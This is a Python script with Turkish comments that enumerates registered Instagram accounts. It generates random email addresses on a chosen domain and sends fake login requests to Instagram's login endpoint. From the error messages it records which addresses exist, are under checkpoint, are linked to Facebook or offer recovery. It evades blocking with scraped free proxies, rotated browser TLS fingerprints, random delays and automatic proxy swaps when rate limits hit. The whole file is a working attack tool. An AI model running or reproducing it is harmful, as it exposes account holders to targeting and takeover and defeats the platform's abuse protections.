import os
import random
import re
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests
from threading import local, Lock
from fp.fp import FreeProxy

# --- KONFİGÜRASYON ---
INPUT_FILE = "okinsta.txt"
SCANNED_FILE = "tarananlar.txt"
TARGET_CYCLE_LIMIT = 360

# Global Değişkenler
scanned_database = set()
failed_proxies = set()
lock = Lock()
stop_flag = False
active_proxy = None

# --- DİNAMİK TLS İMPERSONATE PROFİLLERİ ---
IMPERSONATE_PROFILES = ["chrome119", "chrome120", "safari17_0", "edge101"]

# --- THREAD-LOCAL SESSION VE TOKEN CACHE ---
thread_local = local()

def test_proxy(proxy_str):
    """Hızlıca proxy'nin canlı çalışıp çalışmadığını test eder"""
    try:
        res = requests.get("https://httpbin.org/ip", proxies={"http": proxy_str, "https": proxy_str}, timeout=2)
        if res.status_code == 200:
            return True
    except:
        pass
    return False

def fetch_all_protocols_proxies():
    """Çoklu kaynaklardan hızlıca hammadde proxy havuzu toplar"""
    raw_proxies = set()
    
    # 1. Kaynak: GeoNode
    try:
        geonode_url = "https://proxylist.geonode.com/api/proxy-list?limit=40&page=1&sort_by=lastChecked&sort_type=desc"
        res = requests.get(geonode_url, timeout=2)
        if res.status_code == 200:
            for item in res.json().get("data", []):
                ip, port, protocols = item.get("ip"), item.get("port"), item.get("protocols", [])
                if ip and port:
                    for proto in protocols:
                        raw_proxies.add(f"{proto}://{ip}:{port}")
    except:
        pass

    # 2. Kaynak: ProxyScrape
    try:
        for proto in ["http", "socks4", "socks5"]:
            url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={proto}&timeout=2000&country=all"
            res = requests.get(url, timeout=2)
            if res.status_code == 200:
                for line in res.text.splitlines():
                    if line.strip():
                        raw_proxies.add(f"{proto}://{line.strip()}")
    except:
        pass

    # 3. Kaynak: Free-Proxy
    try:
        for _ in range(2):
            fp = FreeProxy(https=True).get()
            if fp:
                raw_proxies.add(fp)
    except:
        pass

    return list(raw_proxies)

def get_fresh_working_proxy():
    """İLK YAKALADIĞI ÇALIŞAN (LIVE) PROXY İLE ANINDA BAŞLAR (Bekleme süresini sıfırlar)"""
    global failed_proxies
    print("\n🔍 [HIZLI PROXY] Havuz taranıyor, ilk çalışan live proxy yakalanacak...")
    
    pool = fetch_all_protocols_proxies()
    random.shuffle(pool)
    
    # Kara listedekileri ayıkla
    valid_pool = [p for p in pool if p not in failed_proxies]
    if not valid_pool:
        print("⚠️ Kara liste temizleniyor...")
        with lock:
            failed_proxies.clear()
        valid_pool = pool

    # Paralel test ile İLK BULUNAN LIVE PROXY'DE DÖNGÜYÜ KIR VE DÖN
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_proxy = {executor.submit(test_proxy, p): p for p in valid_pool}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    print(f"⚡ [İLK LIVE PROXY YAKALANDI] ---> {proxy}")
                    return proxy
            except:
                pass
                
    # Hiçbiri çalışmazsa kısa bir es verip tekrar dener
    print("⚠️ Anlık live proxy bulunamadı, tekrar deneniyor...")
    time.sleep(1)
    return get_fresh_working_proxy()

def get_session():
    global active_proxy
    if not active_proxy:
        active_proxy = get_fresh_working_proxy()

    if not hasattr(thread_local, "session") or getattr(thread_local, "current_proxy", None) != active_proxy:
        chosen_profile = random.choice(IMPERSONATE_PROFILES)
        proxies_dict = {
            "http": active_proxy,
            "https": active_proxy,
        }
        
        session = requests.Session(impersonate=chosen_profile, proxies=proxies_dict)
        thread_local.session = session
        thread_local.current_proxy = active_proxy
        
        try:
            home_res = session.get("https://www.instagram.com/", timeout=8)
            csrftoken = session.cookies.get("csrftoken", domain=".instagram.com")
            if not csrftoken:
                for c in session.cookies:
                    if c.name == "csrftoken":
                        csrftoken = c.value
                        break
            thread_local.csrftoken = csrftoken or ""

            lsd_match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', home_res.text)
            thread_local.lsd_token = lsd_match.group(1) if lsd_match else "default_lsd"
        except Exception:
            thread_local.csrftoken = ""
            thread_local.lsd_token = "default_lsd"
            
    return thread_local.session

# --- TARANANLARI YÜKLE ---
if os.path.exists(SCANNED_FILE):
    with open(SCANNED_FILE, "r", encoding="utf-8") as f:
        for line in f:
            scanned_database.add(line.strip().lower())
    print(f"✅ {len(scanned_database)} adet eski taranan kayıt yüklendi.")


def proxy_ip_reset(reason_msg=""):
    global active_proxy, stop_flag, failed_proxies
    
    if active_proxy:
        with lock:
            failed_proxies.add(active_proxy)
            print(f"🚫 [KARA LİSTE] Patlayan proxy eklendi: {active_proxy}")

    print(f"\n📡 [PROXY ROTASYON] {reason_msg} Yeni live proxy aranıyor...")
    active_proxy = get_fresh_working_proxy()
    
    if hasattr(thread_local, "session"):
        delattr(thread_local, "session")
    if hasattr(thread_local, "current_proxy"):
        delattr(thread_local, "current_proxy")
        
    stop_flag = False
    print("🌐 Yeni live proxy ile yola devam ediliyor!")


def auditor_worker(username, target_domain):
    global stop_flag
    if stop_flag:
        return False, None

    session = get_session()
    full_email = f"{username}@{target_domain}"
    
    url = "https://www.instagram.com/accounts/login/ajax/"
    timestamp = int(time.time())
    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:11111111"
    
    try:
        csrftoken = getattr(thread_local, "csrftoken", "")
        lsd_token = getattr(thread_local, "lsd_token", "default_lsd")

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "X-IG-App-ID": "936619743392459",
            "X-CSRFToken": csrftoken,
            "X-FB-LSD": lsd_token,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Origin": "https://www.instagram.com"
        }

        data = {
            "username": full_email,
            "enc_password": enc_password,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "trustedDeviceRecords": "{}"
        }

        time.sleep(random.uniform(0.2, 0.6))
        res = session.post(url, headers=headers, data=data, timeout=12)
        
        try:
            res_json = res.json()
        except:
            res_json = {}

        msg = str(res_json.get("message", ""))
        error_type = str(res_json.get("error_type", ""))
        status_code = res.status_code
        
        if status_code not in (200, 400) or status_code in (403, 429) or "please wait" in msg.lower() or "limit" in msg.lower() or "feedback_required" in msg.lower():
            with lock:
                if not stop_flag:
                    stop_flag = True
                    print(f"\n🚨 [ENGEL / HATA] HTTP Status: {status_code} | Mesaj: {msg}")
            return True, username

        with lock:
            if status_code == 400 and error_type == "UserInvalidCredentials":
                print(f"🟢 [HESAP BULUNDU] {full_email}")
                with open(INPUT_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{full_email}\n")
            
            elif res_json.get("checkpoint_url") or msg == "checkpoint_required":
                print(f"🟠 [CHECKPOINT] {full_email}")
                with open(INPUT_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{full_email}\n")
            
            elif "linked Facebook account" in msg:
                print(f"🔵 [FACEBOOK] {full_email}")
                with open(INPUT_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{full_email}\n")
            
            elif "email to help you get back" in msg:
                print(f"🟣 [RECOVERY] {full_email}")
                with open(INPUT_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{full_email}\n")
                
        return True, username
        
    except Exception as e:
        with lock:
            if not stop_flag:
                stop_flag = True
        return False, None


def main():
    global stop_flag
    print("\n--- INSTAGRAM TARAMA MODÜLÜ (HIZLI İLK LIVE PROXY MODU) ---")
    
    target_domain = os.environ.get("TARGET_DOMAIN", "hi2.in")
    prefix = os.environ.get("PREFIX", "")
    suffix = os.environ.get("SUFFIX", "")
    try:
        random_len = int(os.environ.get("RANDOM_LEN", "5"))
    except:
        random_len = 5

    abc = string.ascii_lowercase

    while True:
        if not os.path.exists(INPUT_FILE):
            with open(INPUT_FILE, "w", encoding="utf-8") as f:
                pass

        stop_flag = False
        instagram_scanned_in_cycle = 0
        print(f"\n🔎 Tarama başlatıldı... (Her {TARGET_CYCLE_LIMIT} sorguda veya hata durumunda IP yenilenecek)")

        while not stop_flag and instagram_scanned_in_cycle < TARGET_CYCLE_LIMIT:
            found_users = []
            batch_target_count = min(50, TARGET_CYCLE_LIMIT - instagram_scanned_in_cycle)
            
            while len(found_users) < batch_target_count and not stop_flag:
                random_part = ''.join(random.choice(abc) for _ in range(random_len))
                u = (prefix + random_part + suffix).lower()
                if u not in scanned_database:
                    found_users.append(u)

            if not found_users or stop_flag:
                break

            batch_tested = []

            def run_worker(u):
                success, scanned_u = auditor_worker(u, target_domain)
                if scanned_u:
                    with lock:
                        batch_tested.append(scanned_u)

            with ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(run_worker, found_users)

            if batch_tested:
                with lock:
                    with open(SCANNED_FILE, "a", encoding="utf-8") as f:
                        for u in batch_tested:
                            f.write(u + "\n")
                            scanned_database.add(u)
                    instagram_scanned_in_cycle += len(batch_tested)
                    print(f"📈 [İlerleme] Bu turda taranan: {instagram_scanned_in_cycle}/{TARGET_CYCLE_LIMIT}")

            if stop_flag:
                print("\n🛑 Engel/Hata algılandı, Hemen yeni live proxy aranıyor...")
                proxy_ip_reset("Hata/Engel Nedeniyle;")
                break

        if instagram_scanned_in_cycle >= TARGET_CYCLE_LIMIT:
            print(f"\n🎯 {TARGET_CYCLE_LIMIT} sorgu sınırına ulaşıldı! Yeni live proxy aranıyor...")
            proxy_ip_reset("360 Sorgu Limiti Dolduğu İçin;")

        print(f"\n🔄 Döngü yenileniyor...\n" + "="*40)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram kullanıcı tarafından durduruldu.")
